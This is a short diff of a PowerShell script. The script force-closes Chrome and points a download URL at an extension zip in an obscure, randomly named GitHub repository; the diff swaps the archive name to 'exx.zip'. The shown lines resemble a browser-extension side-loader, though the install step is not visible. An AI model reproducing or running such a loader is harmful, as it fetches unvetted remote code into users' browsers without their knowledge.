@@ -2,7 +2,7 @@
 Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
 
 # ---------- CONFIG ----------
-$zipUrl    = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip"
+$zipUrl    = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/exx.zip"
 $chromeExe = (Get-Command chrome -ErrorAction SilentlyContinue).Source
 if (-not $chromeExe) {
     $chromeExe = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
